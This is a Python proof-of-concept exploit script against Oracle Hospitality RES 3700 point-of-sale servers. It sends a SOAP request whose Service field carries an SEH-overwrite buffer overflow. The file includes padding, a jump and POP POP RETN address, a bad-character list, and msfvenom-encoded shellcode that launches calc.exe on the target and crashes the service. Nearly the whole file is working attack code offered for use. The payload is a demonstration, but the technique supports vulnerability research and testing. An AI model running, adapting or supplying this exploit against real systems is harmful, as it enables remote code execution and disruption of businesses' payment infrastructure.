#!/usr/bin/env python

#Author: Walid Faour
#Date: Aug. 28, 2019
#Oracle Hospitality RES 3700 Calc Exploit

import requests

print
print '------------------------------------------'
print 'Oracle Hospitality RES 3700 - Calc Exploit'
print '------------------------------------------'
print

IP = raw_input("Enter IP address of the server: ")
URL = "http://" + IP  + ":50123"

#Bad characters:
#\x00 #\x71 #\x75 #\x76 #\x92 #\x83 #\x94  #\x84 #\x95 #\x9e #\x87 #\x8e #\x86 #\x89 #\x91 #\x9f #\x9c #\x99

junk1 = "A" * 35 
nseh ="\xEB\x06\x90\x90" #6 byte JMP (Pointer to Next SEH record)
seh="\x1D\x13\xAB\x77" #POP POP RETN (SE Handler - Address is 0x7740131E)
junk2 = "B" * 2706 #Needed to overwrite Next SEH and SE Handler.

#calc.exe
#msfvenom -a x86 --platform windows -e x86\alpha_upper -p windows/exec cmd=calc.exe EXITFUNC=seh -b "\x00\x71\x75\x92\x83\x94\x84\x95\x9e\x87\x8e\x86\x89\x91\x9f\x9c\x99" -f python
#shellcode size = 193 bytes / characters
shellcode = ("\x54\x5b\xd9\xeb\xd9\x73\xf4\x5f\x57\x59\x49\x49\x49"
	     "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
	     "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
	     "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
	     "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
	     "\x4a\x49\x4b\x4c\x4b\x58\x4c\x42\x35\x50\x55\x50\x53"
	     "\x30\x55\x30\x4c\x49\x4d\x35\x46\x51\x59\x50\x55\x34"
	     "\x4c\x4b\x56\x30\x36\x50\x4c\x4b\x50\x52\x54\x4c\x4c"
	     "\x4b\x36\x32\x54\x54\x4c\x4b\x33\x42\x37\x58\x34\x4f"
	     "\x58\x37\x31\x5a\x57\x56\x56\x51\x4b\x4f\x4e\x4c\x57"
	     "\x4c\x53\x51\x43\x4c\x53\x32\x46\x4c\x57\x50\x59\x51"
	     "\x58\x4f\x34\x4d\x33\x31\x59\x57\x4a\x42\x4c\x32\x56"
	     "\x32\x50\x57\x4c\x4b\x51\x42\x52\x30\x4c\x4b\x31\x5a"
	     "\x37\x4c\x4c\x4b\x30\x4c\x44\x51\x52\x58\x4d\x33\x30"
	     "\x48\x33\x31\x38\x51\x30\x51\x4c\x4b\x56\x39\x37\x50"
	     "\x55\x51\x39\x43\x4c\x4b\x47\x39\x54\x58\x4a\x43\x36"
	     "\x5a\x37\x39\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x58\x56"
	     "\x50\x31\x4b\x4f\x4e\x4c\x39\x51\x58\x4f\x54\x4d\x35"
	     "\x51\x59\x57\x57\x48\x4b\x50\x52\x55\x5a\x56\x53\x33"
	     "\x53\x4d\x5a\x58\x57\x4b\x43\x4d\x51\x34\x53\x45\x5a"
	     "\x44\x30\x58\x4c\x4b\x36\x38\x36\x44\x53\x31\x4e\x33"
	     "\x33\x56\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x30\x58\x55"
	     "\x4c\x55\x51\x4e\x33\x4c\x4b\x53\x34\x4c\x4b\x43\x31"
	     "\x4e\x30\x4b\x39\x31\x54\x31\x34\x37\x54\x31\x4b\x51"
	     "\x4b\x53\x51\x56\x39\x30\x5a\x36\x31\x4b\x4f\x4d\x30"
	     "\x51\x4f\x31\x4f\x51\x4a\x4c\x4b\x42\x32\x4a\x4b\x4c"
	     "\x4d\x51\x4d\x53\x5a\x53\x31\x4c\x4d\x4b\x35\x48\x32"
	     "\x33\x30\x43\x30\x43\x30\x50\x50\x55\x38\x50\x31\x4c"
	     "\x4b\x32\x4f\x4d\x57\x4b\x4f\x59\x45\x4f\x4b\x4b\x4e"
	     "\x54\x4e\x36\x52\x4a\x4a\x43\x58\x4f\x56\x4d\x45\x4f"
	     "\x4d\x4d\x4d\x4b\x4f\x38\x55\x57\x4c\x35\x56\x53\x4c"
	     "\x54\x4a\x4b\x30\x4b\x4b\x4d\x30\x32\x55\x54\x45\x4f"
	     "\x4b\x50\x47\x35\x43\x44\x32\x42\x4f\x42\x4a\x43\x30"
	     "\x31\x43\x4b\x4f\x48\x55\x32\x43\x45\x31\x32\x4c\x32"
	     "\x43\x36\x4e\x43\x55\x52\x58\x52\x45\x55\x50\x41\x41")
			
exploit = junk1 + nseh + seh + shellcode + junk2

body = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
			<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
				<MCRS-ENV:Service>' + exploit + '</MCRS-ENV:Service> \
				<MCRS-ENV:Method>Reboot</MCRS-ENV:Method> \
				<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
					<MCRS-ENV:InputParameters> \
					</MCRS-ENV:InputParameters> \
			</SOAP-ENV:Body> \
		   </SOAP-ENV:Envelope>'
		   
headers = {
	"Content-Type" : "text/xml",
	"User-Agent" : "MDS POS Client",
	"Host" : IP + ":50123",
	"Content-Length" : str(len(body)),
	"Connection" : "Keep-Alive"
}

print 'Executing calc.exe on Oracle Hospitality RES 3700 at IP address ' + IP + '...'
try:
	send = requests.post(URL,data=body,headers=headers)
except requests.exceptions.ConnectionError:
	print 'Calc.exe executed and remote service crashed.'
